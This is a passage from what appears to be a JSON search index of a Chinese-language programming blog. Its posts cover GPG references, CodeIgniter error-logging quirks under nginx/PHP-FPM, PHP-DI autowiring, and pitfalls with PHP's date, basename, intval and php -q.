rel=\"noopener\">Java GPG解密关于:encrypted message contains a signed message - not literal data.的解决_程序地带</a></p>\n<p><a href=\"https://www.openpgp.org/software/kleopatra/\" target=\"_blank\" rel=\"noopener\">Kleopatra - OpenPGP</a></p>\n<p><a href=\"https://zh.wikipedia.org/wiki/Gpg4win\" target=\"_blank\" rel=\"noopener\">Gpg4win - 維基百科，自由的百科全書</a></p>\n<pre><code>GnuPG: 核心加密工具\nKleopatra: 用於OpenPGP與X.509的憑證管理。\nGPA: 另一個可選的憑證管理\nGpgOL: Microsoft Outlook外掛程式，用於電子郵件加密\nGpgEX: Windows Explorer外掛程式，用於檔案加密\nGpg4win Compendium: Gpg4win2的文件\n</code></pre><p><a href=\"https://gnupg.org/related_software/swlist.html\" target=\"_blank\" rel=\"noopener\">GnuPG - Software list</a></p>\n<h2 id=\"更多-GPG-教學\"><a href=\"#更多-GPG-教學\" class=\"headerlink\" title=\"更多 GPG 教學\"></a>更多 GPG 教學</h2><p>目前只有使用加解密跟 GIT 簽章<br>不過好像還有更進階用法<br>但是…目前好像用不太到<br>先預留一下爬到不錯文章</p>\n<p><a href=\"https://ulyc.github.io/2021/01/13/2021%E5%B9%B4-%E7%94%A8%E6%9B%B4%E7%8E%B0%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8PGP-%E4%B8%8A/\" target=\"_blank\" rel=\"noopener\">2021年，用更现代的方法使用PGP（上） - C的博客 |UlyC</a><br><a href=\"https://imgur.com/wkvbboi.png\" target=\"_blank\" rel=\"noopener\">備份圖</a></p>\n<p><a href=\"https://ulyc.github.io/2021/01/18/2021%E5%B9%B4-%E7%94%A8%E6%9B%B4%E7%8E%B0%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8PGP-%E4%B8%AD/\" target=\"_blank\" rel=\"noopener\">2021年，用更现代的方法使用PGP（中） - C的博客 |UlyC</a> <a href=\"https://imgur.com/LWYWSsm.png\" target=\"_blank\" rel=\"noopener\">備份圖</a></p>\n<p><a href=\"https://ulyc.github.io/2021/01/26/2021%E5%B9%B4-%E7%94%A8%E6%9B%B4%E7%8E%B0%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8PGP-%E4%B8%8B/\" target=\"_blank\" rel=\"noopener\">2021年，用更现代的方法使用PGP（下） - C的博客 |UlyC</a> <a href=\"https://imgur.com/V07AWzh.png\" target=\"_blank\" rel=\"noopener\">備份圖</a></p>\n<h2 id=\"InvalidKeyException-Illegal-key-size-測試解決成功\"><a href=\"#InvalidKeyException-Illegal-key-size-測試解決成功\" class=\"headerlink\" title=\"InvalidKeyException: Illegal key size(測試解決成功)\"></a>InvalidKeyException: Illegal key size(測試解決成功)</h2><p>要安裝 JCE，原本不相信，但真的測試嚇一跳。還真的要安裝…<br>PS: 我專案是Java1.7，1.8竟然可以跑</p>\n<p><img src=\"https://i.imgur.com/XJscXex.png\" alt=\"\"></p>\n<p><a href=\"https://www.xuchengen.cn/451\" target=\"_blank\" rel=\"noopener\">InvalidKeyException: Illegal key size异常解决方案 – 思码老徐</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_44102477/article/details/88717815\" target=\"_blank\" rel=\"noopener\">关于PGP解密基于Java Bouncy Castle_-0.0-的博客-CSDN博客</a></p>\n<p><a href=\"https://askie.today/git-pgp-keys/\" target=\"_blank\" rel=\"noopener\">新增 Git GPG Key 增加安全性 - Askie’s Coding Life</a></p>\n<h2 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h2><p><a href=\"http://sloanseaman.com/wordpress/2011/08/11/pgp-encryptiondecryption-in-java/\" target=\"_blank\" rel=\"noopener\">PGP Encryption/Decryption in Java | Waiting for Wit</a></p>\n","categories":["Java"],"tags":["java","pgp","gpg"]},{"title":"PHP CI 框架不會記錄 ERROR 到 nginx log裡解決方案","url":"/blog/2019/06/03/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/","content":"<p><a href=\"https://malagege.github.io/blog/2019/05/22/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/\">PHP-FPM 打開 error log 方法 | 程式狂想筆記</a><br>之前紀錄 PHP-FPM ERROR 錯誤方法<br>但今天發現公司的 CI 還是沒有紀錄 LOG<br>追查了一下原因，原來 CI 有做 <code>set_error_handler</code> …<br>這邊詳細記錄這個雷</p>\n<a id=\"more\"></a>\n<p>事情是這樣的<br>n 個月前，我們公司用了 CI 做開發<br>由於第一次把 CI 放在 docker container 下<br>結果查看 log 的時候竟然沒有紀錄 log …<br>當初以為是 docker 或 php-fpm 設定的問題<br>或者 display_error 或 error_reporting 問題</p>\n<p>但今天發現是 CI 問題!!!!</p>\n<h2 id=\"發現事情不單純\"><a href=\"#發現事情不單純\" class=\"headerlink\" title=\"發現事情不單純\"></a>發現事情不單純</h2><p>CI 故意寫錯 log，但是 nginx docker 上面竟然就是沒有 log<br>但發現直連 <code>test.php</code>(非用 CI 框架)正常<br>這時候我就測試在 <code>index.php</code> 幾行都會記入到 nginx log<br>但發現放在 <code>index.php</code> 最下面錯誤不會出來</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> BASEPATH.<span class=\"string\">'core/CodeIgniter.php'</span>;</span><br></pre></td></tr></table></figure>\n<p>這時候我覺得 Codeigniter 有鬼</p>\n<p>有猜到是 Codeigniter.php 裡面的這三行搞鬼<br>注解掉就可以用了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tset_error_handler(<span class=\"string\">'_error_handler'</span>);</span><br><span class=\"line\">\tset_exception_handler(<span class=\"string\">'_exception_handler'</span>);</span><br><span class=\"line\">    register_shutdown_function(<span class=\"string\">'_shutdown_handler'</span>);</span><br></pre></td></tr></table></figure>\n<p>有找一下，set_error_handler</p>\n<blockquote>\n<p>It is important to remember that the standard PHP error handler is completely bypassed for the error types specified by error_types unless the callback function returns FALSE. error_reporting() settings will have no effect and your error handler will be called regardless - however you are still able to read the current value of error_reporting and act appropriately. Of particular note is that this value will be 0 if the statement that caused the error was prepended by the @ error-control operator.<br><a href=\"https://www.php.net/manual/en/function.set-error-handler.php\" target=\"_blank\" rel=\"noopener\">PHP: set_error_handler - Manual</a><br>簡單說就是錯誤，會執行 set_error_handler<br>但是預設錯誤的 function 不會執行<br>除非裡面 return false(目前還沒測差過)</p>\n</blockquote>\n<p>不過 CI 沒有記錄 php stderr ，所以導致 CI 沒有紀錄 (PS: 這個是我的猜測)<br><a href=\"https://learnku.com/articles/5765/brief-introduction-of-standard-input-and-output-of-php\" target=\"_blank\" rel=\"noopener\">简述 PHP 的标准输入与输出 | Laravel China 社区</a><br>目前猜測可能寫 stderr 會出現到 log 上面</p>\n<p><strong>2019-06-04 小記</strong><br>今天公司小測<br>使用<code>file_put_contents(&#39;php://stderr&#39;,&#39;this is a log&#39;);</code><br>會被 php-fpm 記錄起來，但是 nginx 好像不會收到<br>目前猜測可能不是從 php-fpm 寫進去…<br>所以才不會記錄(?)<br>但已經能解決自行寫入 log 問題<br>正常接到 php-fpm 的 stderr (nginx docker)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">  thrown in /usr/local/nginx/html/index.php on line 364&quot; while reading response header from upstream, client: 10.56.158.42, server: localhost, request: &quot;GET / HTTP/1.1&quot;, upstream: &quot;fastcgi://192.168.112.8:9000&quot;, host: &quot;10.56.159.10&quot;,</span><br><span class=\"line\">10.56.158.42 - - [03/Jun/2019:09:42:46 +0000] &quot;GET / HTTP/1.1&quot; 200 238 &quot;-&quot; &quot;PostmanRuntime/7.13.0&quot;,</span><br><span class=\"line\">2019/06/03 09:43:36 [error] 6#6: *46 FastCGI sent in stderr: &quot;PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function dffffffffffffff() in /usr/local/nginx/html/index.php:364,\u0002</span><br></pre></td></tr></table></figure>\n<p>error_log(‘this is a log .’,0);<br>也能做到一樣的事情<br>但一樣 nginx 那一邊不會出現 log ，只會在 nginx<br>不知道為什麼…<br><a href=\"https://www.php.net/manual/en/function.error-log.php\" target=\"_blank\" rel=\"noopener\">PHP: error_log - Manual</a><br>3 選項可以寫路徑，但感覺會沒有權限寫的感覺<br>有空試試</p>\n<p>CI 有做 set_error_handler<br>http code 500 錯誤<br>所以可能開啟<code>display_error,1</code>時候<br>http code 碼會是 200</p>\n<blockquote>\n<p>When display_errors is on it will return 200 always.<br>When display_errors is off it will return 500.<br><a href=\"https://stackoverflow.com/questions/28972933/apache-php-returns-http-status-code-200-on-error-pages\" target=\"_blank\" rel=\"noopener\">Apache/PHP returns HTTP Status Code 200 on error pages - Stack Overflow</a></p>\n</blockquote>\n<p>就先研究到這邊<br><a href=\"https://gist.github.com/joerx/87c6755023d2817154b41264311fcfe6\" target=\"_blank\" rel=\"noopener\">redirect php-fpm output to nginx’s error log</a></p>\n<hr>\n<p>最後在<a href=\"https://blog.csdn.net/zhang197093/article/details/75215812\" target=\"_blank\" rel=\"noopener\">CI 框架不写 Nginx 错误日志的原因分析及解决办法 - zhang197093 的博客 - CSDN 博客</a><br>看到真的有人遇到一樣的問題</p>\n<p>這個太雷了 冏!!!</p>\n<p>其他參考</p>\n<p><a href=\"https://www.php.net/manual/zh/errorfunc.constants.php\" target=\"_blank\" rel=\"noopener\">PHP: 预定义常量 - Manual</a><br><a href=\"https://www.php.net/manual/zh/function.restore-error-handler.php\" target=\"_blank\" rel=\"noopener\">PHP: restore_error_handler - Manual</a><br><a href=\"https://blog.csdn.net/zhang197093/article/details/75215812\" target=\"_blank\" rel=\"noopener\">CI 框架不写 Nginx 错误日志的原因分析及解决办法 - zhang197093 的博客 - CSDN 博客</a></p>\n","categories":["PHP"],"tags":["php","nginx"]},{"title":"PHP-DI 簡單自動注入小記","url":"/blog/2020/02/10/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/","content":"<p>最近跑去看 PHP-DI<br>簡單實作小記</p>\n<a id=\"more\"></a>\n<h2 id=\"簡單講解\"><a href=\"#簡單講解\" class=\"headerlink\" title=\"簡單講解\"></a>簡單講解</h2><p>在使用 Spring boot 和 Laravel 上，常常看到自動注入的範例<br>很多文章沒有深入講解為什麼可以做自動注入</p>\n<p>這段時間我使用到 Spring boot 的 <code>@autowired</code> 做自動注入<br>明白在框架中有有一個機制在控制你裡面放的需要 <code>new</code> 出來的物件<br>在使用上可以說<br>最近再回頭看 php-di 就突然了解了</p>\n<p>更多講解可以看<a href=\"https://malagege.github.io/blog/2019/07/16/Laravel-%E5%AF%A6%E4%BD%9C%E5%B0%8F%E8%A8%98/#%E6%9C%8D%E5%8B%99%E5%AE%B9%E5%99%A8\">Laravel 實作小記 | 程式狂想筆記</a><br>之前有記錄幾個網站有詳細談到</p>\n<h2 id=\"自動注入\"><a href=\"#自動注入\" class=\"headerlink\" title=\"自動注入\"></a>自動注入</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第 1 步: 建立 DI container</span></span><br><span class=\"line\">$builder = <span class=\"keyword\">new</span> \\DI\\ContainerBuilder();</span><br><span class=\"line\">$container = $builder-&gt;build();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第 2 步: 建立 class </span></span><br><span class=\"line\">$a = $container-&gt;get(<span class=\"string\">'A'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第 3 步: 建立 DI 實作 class，B class 不需要做 new 動作</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_b;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">(B $b)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_b = $b;</span><br><span class=\"line\">        <span class=\"comment\">// $b-&gt;hello();</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Hello World! B\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"B:say hello\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"autowiring-出來都是單例模式\"><a href=\"#autowiring-出來都是單例模式\" class=\"headerlink\" title=\"autowiring 出來都是單例模式\"></a>autowiring 出來都是單例模式</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$builder = <span class=\"keyword\">new</span> \\DI\\ContainerBuilder();</span><br><span class=\"line\">$container = $builder-&gt;build();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$a = $container-&gt;get(<span class=\"string\">'A'</span>);</span><br><span class=\"line\">$a_b = $a-&gt;get_B();</span><br><span class=\"line\">$b = $container-&gt;get(<span class=\"string\">'B'</span>);</span><br><span class=\"line\">var_dump($a_b === $b); <span class=\"comment\"># true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_b;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">(B $b)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_b = $b;</span><br><span class=\"line\">        <span class=\"comment\">// $b-&gt;hello();</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_B</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;_b;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Hello World! B\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"B:say hello\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BTW: <a href=\"https://www.jianshu.com/p/6f0b148d698b\" target=\"_blank\" rel=\"noopener\">Spring IOC 单例和多例 - 简书</a><br><a href=\"https://github.com/hailindai/SSMSample\" target=\"_blank\" rel=\"noopener\">hailindai/SSMSample</a></p>\n","categories":["PHP"],"tags":["php","di"]},{"title":"PHP-FPM 打開 error log 方法","url":"/blog/2019/05/22/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/","content":"<p>最近用 docker 使用 portainer 看 log<br>卻沒有看到我想要的程式錯誤資訊<br>查了一下 PHP-FPM 預設沒有打開</p>\n<a id=\"more\"></a>\n<p><strong> 2019-06-03 </strong></p>\n<p>這篇 php-fpm 雖然不會記入 log<br>假如有用 docker 執行的話<br>可以在 docker 下看 log<br>不用調整 php-fpm<br>用 docker 的人可能不需要調整</p>\n<p>可詳細<br><a href=\"/blog/2019/06/03/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/\">PHP CI 框架不會記錄 ERROR 到 nginx log 裡解決方案 | 程式狂想筆記</a></p>\n<h2 id=\"PHP-FPM-調整設定\"><a href=\"#PHP-FPM-調整設定\" class=\"headerlink\" title=\"PHP-FPM 調整設定\"></a>PHP-FPM 調整設定</h2><p>/usr/local/etc/php-fpm.d/<a href=\"http://www.conf\" target=\"_blank\" rel=\"noopener\">www.conf</a></p>\n<blockquote>\n<p>找到 catch_workers_output 設定，改為 yes<br>; Redirect worker stdout and stderr into main error log. If not set, stdout and<br>; stderr will be redirected to /dev/null according to FastCGI specs.<br>; Default Value: no<br>catch_workers_output = yes</p>\n</blockquote>\n<p><a href=\"https://xyz.cinc.biz/2016/07/php-fpm-error-log.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: PHP FPM 錯誤記錄不會寫到 error log ?</a></p>\n<blockquote>\n<ol>\n<li>修改 php-fpm.conf 文件，添加（或修改）如下配置：</li>\n</ol>\n<p>[global]<br>error_log = log/error_log &lt;– 這個我沒設定，只設定 catch_workers_output = yes</p>\n<p>[www]<br>catch_workers_output = yes</p>\n<ol start=\"2\">\n<li>修改 php.ini 文件，添加（或修改）如下配置：</li>\n</ol>\n<p>log_errors = On<br>error_log = “/usr/local/lnmp/php/var/log/error_log”<br>error_reporting=E_ALL&amp;~E_NOTICE</p>\n<ol start=\"3\">\n<li>重启 php-fpm</li>\n</ol>\n</blockquote>\n<p>參考來源:<br><a href=\"https://gist.github.com/BiosSun/7244141\" target=\"_blank\" rel=\"noopener\">开启 php-fpm 错误日志</a></p>\n<h2 id=\"設定-PHP-Log-小方法\"><a href=\"#設定-PHP-Log-小方法\" class=\"headerlink\" title=\"設定 PHP Log 小方法\"></a>設定 PHP Log 小方法</h2><p>在用 docker PHP-FPM 路徑在/usr/local/etc/php-fpm.d/<a href=\"http://www.conf\" target=\"_blank\" rel=\"noopener\">www.conf</a><br>因為我 docker 沒安裝 vi, nano<br>所以我想用 <code>sed</code> 修改檔案</p>\n<blockquote>\n<p>這時候要把這個文件的 phobia 通通改成 phobe：</p>\n<pre><code>sed -i -e &apos;s/phobia/phobe/&apos; phobia.txt\nsed -i -e &apos;s/phobia/phobe/g&apos; phobia.txt\nsed -i .bak -e &apos;s/phobia/phobe/g&apos; phobia.txt\n</code></pre><p>注意-i 代表 Edit file in-place，也就是直接編輯檔案的意思</p>\n<p>第 2 個指令多了一個 g, 代表同一行裡面如果出現多次則通通修改；第 1 個指令只會改掉每一行裡面第一個遇到的 pattern。在 Mac 裡面-i 的行為跟在 Linux 下會不一樣，像是第 3 行的<br>指令在 Linux 下就只會直接編輯檔案；但在 Mac 下卻會被備份一個檔案後面接著-e</p>\n<p>第 3 行指令裡面的-i 後面接.bak 意思為，把原始的檔案多加.bak 存成備份。<br><a href=\"https://2formosa.blogspot.com/2018/03/sed-edit-a-file-directly.html\" target=\"_blank\" rel=\"noopener\">阿就操場啊~: sed 直接編輯文件，做文字取代</a></p>\n</blockquote>\n<p>所以簡單使用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">'s/;catch_workers_output = yes/catch_workers_output = yes/g'</span> www.conf</span><br></pre></td></tr></table></figure>\n<p>相關連結<br><a href=\"https://henter.me/post/sed-notes.html\" target=\"_blank\" rel=\"noopener\">Sed 的常用命令语法备忘【转】 | Henter</a></p>\n","categories":["PHP"],"tags":["php","php-fpm"]},{"title":"[PHP]basename採雷記","url":"/blog/2018/06/24/PHP-basename%E6%8E%A1%E9%9B%B7%E8%A8%98/","content":"<p>最近跟同事看smarty，覺得怪怪….<br>display(basename(‘xxxx.php’,php));</p>\n<p>後來參發現basename第二個參數不會帶.php<br>真的 點點點…</p>\n<p>不熟這個function，一眼真的會猜錯…<br>這種小雷希望不要再採到</p>\n<a id=\"more\"></a>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//顯示帶有文件擴展名的文件名</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> basename($path);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//顯示不帶有文件擴展名的文件名</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> basename($path,<span class=\"string\">\".php\"</span>);</span><br></pre></td></tr></table></figure>","categories":["PHP"],"tags":["php","basename","filepath"]},{"title":"[PHP] date跳坑記","url":"/blog/2018/07/02/PHP-date%E8%B7%B3%E5%9D%91%E8%A8%98/","content":"<h2 id=\"PHP-date跳坑記\"><a href=\"#PHP-date跳坑記\" class=\"headerlink\" title=\"[PHP] date跳坑記\"></a>[PHP] date跳坑記</h2><p>今天程式出個bug，竟然提早12小時商品下架<br><del>我以為m是分鐘，h是小時</del><br>i是分鐘，H是小時(24小時制) h是12小時制<br>看了一下程式邏輯好像都沒有問題<br>最後找到原因!!!<br><a id=\"more\"></a></p>\n<p><em>錯誤code</em><br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">date(<span class=\"string\">\"Y-m-d h:m:s\"</span>,strtotime(<span class=\"string\">\"+7 days\"</span>));</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"正確寫法\"><a href=\"#正確寫法\" class=\"headerlink\" title=\"正確寫法\"></a>正確寫法</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">date(<span class=\"string\">\"Y-m-d H:i:s\"</span>);</span><br></pre></td></tr></table></figure>\n<p>d     月份中的第几天，有前导零的 2 位数字     01 到 31<br>D     星期中的第几天，文本表示，3 个字母     Mon 到 Sun<br>m     数字表示的月份，有前导零     01 到 12<br>M     三个字母缩写表示的月份     Jan 到 Dec<br>n     数字表示的月份，没有前导零     1 到 12<br>t     指定的月份有几天     28 到 31<br>Y     4 位数字完整表示的年份     例如：1999 或 2003<br>y     2 位数字表示的年份     例如：99 或 03<br>a     小写的上午和下午值     am 或 pm<br>A     大写的上午和下午值     AM 或 PM<br>g     小时，12 小时格式，没有前导零     1 到 12<br>G     小时，24 小时格式，没有前导零     0 到 23<br>h     小时，12 小时格式，有前导零     01 到 12<br>H     小时，24 小时格式，有前导零     00 到 23<br>i     有前导零的分钟数     00 到 59&gt;<br>s     秒数，有前导零     00 到 59&gt;</p>\n","categories":["PHP"],"tags":["PHP","date"]},{"title":"PHP intval跟(int)強制轉型差別","url":"/blog/2019/02/24/PHP-intval%E8%B7%9F-int-%E5%BC%B7%E5%88%B6%E8%BD%89%E5%9E%8B%E5%B7%AE%E5%88%A5/","content":"<p>最近寫 PHP 使用 intval()做字串轉數值<br>之前有看到一篇文章，PHP 也有轉型<code>(int)&#39;134&#39;</code><br>這兩個有沒有差別，當下我也不知道<br>只是<code>intval()</code>看起來很順眼<br>所以選擇這個方法<br>但我最近在 Google 搜尋<br>發現我錯了</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">For years I&apos;ve been using intval($var) for being sure something is an integer, and sometimes using (int)$var to cast it into an integer, which essentially does the same thing — learn what casting is.</span><br><span class=\"line\"></span><br><span class=\"line\">I&apos;m here to tell you that unless you require the second parameter of intval(), which changes the base, then you should be casting instead.</span><br><span class=\"line\"></span><br><span class=\"line\">In the case of casting int, it&apos;s about 300% or 3 times as fast as using intval(), and if you use it a lot like I do, for example in setting the correct type/checking for SQL queries, then it&apos;s time to switch. I know I am.</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://tonyshowoff.com/articles/casting-int-faster-than-intval-in-php/\" target=\"_blank\" rel=\"noopener\">Casting int faster than intval in PHP – Tony Showoff</a><br>這篇文獻能看到 intval 是比較吃效能的</p>\n<p>那我就想<code>intval()</code>有何作用?<br><a href=\"https://stackoverflow.com/questions/1912599/is-there-any-particular-difference-between-intval-and-casting-to-int-int-x\" target=\"_blank\" rel=\"noopener\">php - Is there any particular difference between intval and casting to int - <code>(int) X</code>? - Stack Overflow</a><br>原來主要可以算 2 進位和 8 進位</p>\n<p>現在仔細想想，JavaScript 也有一個<code>parseInt(xxx)</code><br>這個第二個參數沒帶，第一個參數 0 開頭是<code>8位元算</code><br>這個我曾經踩過，因為 uid 是 0 開頭，剛好要轉數字，跑出一個錯誤訊息，後來才知道轉成 8 位元<br>有聽到資深的前輩說後面第二個參數還是乖乖加個<code>10</code>會比較好</p>\n<p>參考來源</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/1912599/is-there-any-particular-difference-between-intval-and-casting-to-int-int-x\" target=\"_blank\" rel=\"noopener\">php - Is there any particular difference between intval and casting to int - <code>(int) X</code>? - Stack Overflow</a></li>\n<li><a href=\"http://tonyshowoff.com/articles/casting-int-faster-than-intval-in-php/\" target=\"_blank\" rel=\"noopener\">Casting int faster than intval in PHP – Tony Showoff</a></li>\n<li><a href=\"https://stackoverflow.com/questions/7371991/php-string-cast-vs-strval-function-which-should-i-use\" target=\"_blank\" rel=\"noopener\">Php string cast vs strval function which should I use? - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/1912599/is-there-any-particular-difference-between-intval-and-casting-to-int-int-x\" target=\"_blank\" rel=\"noopener\">php - Is there any particular difference between intval and casting to int - <code>(int) X</code>? - Stack Overflow</a></li>\n</ul>\n","categories":["PHP"],"tags":["php"]},{"title":"PHP -q 是什麼指令","url":"/blog/2019/08/14/PHP-q-%E6%98%AF%E4%BB%80%E9%BA%BC%E6%8C%87%E4%BB%A4/","content":"<p>最近看到公司舊的排程有這個指令<br><code>php -h</code> 沒有看到<br>後來官網看到被廢棄掉</p>\n<a id=\"more\"></a>\n<p>稍微研究了一下<br>好像跟以前執行程式有關係</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> $ php-cgi p.php</span><br><span class=\"line\"></span><br><span class=\"line\">    X-Powered-By: PHP/5.5.18</span><br><span class=\"line\">    Content-type: text/html</span><br><span class=\"line\">    hello world</span><br><span class=\"line\"></span><br><span class=\"line\">You can suppress these headers:</span><br><span class=\"line\">$ php-cgi -q p.php</span><br><span class=\"line\">    hello world</span><br><span class=\"line\">The php executable in recent versions of PHP doesn&apos;t need this. Using -q or not using -q gives the same result:</span><br><span class=\"line\">    $ php -q p.php</span><br><span class=\"line\">hello world</span><br><span class=\"line\">$ php p.php</span><br><span class=\"line\">hello world</span><br></pre></td></tr></table></figure>\n<p>參考來源:<br><a href=\"https://www.quora.com/What-does-PHP-q-do-as-opposed-to-PHP-when-executing-a-PHP-script-from-command-line\" target=\"_blank\" rel=\"noopener\">What does ‘PHP -q’ do as opposed to ‘PHP’ when executing a PHP script from command line? - Quora</a></p>\n<p>排程<br><a href=\"http://cn.voidcc.com/question/p-zeaiytux-bbx.html\" target=\"_blank\" rel=\"noopener\">用于监控 cron 作业和自动化任务的系统？ - VoidCC</a></p>\n","categories":["PHP"],"tags":["php"]},{"title":"PHP return 特別的用法小記","url":"/blog/2019/09/08/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/","content":"<p>今天看到我同事用 <code>return</code> 寫在 xxx.php(沒有寫在 return 裡面)<br>我印象中 return 通常都寫在 function 裡面<br>查看了一下官方文件 <a href=\"https://www.php.net/manual/zh/function.return.php\" target=\"_blank\" rel=\"noopener\">PHP: return - Manual</a><br>可以寫在 function 外面</p>\n<a id=\"more\"></a>\n<h2 id=\"先講講單一文件\"><a href=\"#先講講單一文件\" class=\"headerlink\" title=\"先講講單一文件\"></a>先講講單一文件</h2><p>文件有講到 return 不是一個 function<br>先講講這個跟 <code>die/exit</code>哪裡不一樣</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exit</span>(<span 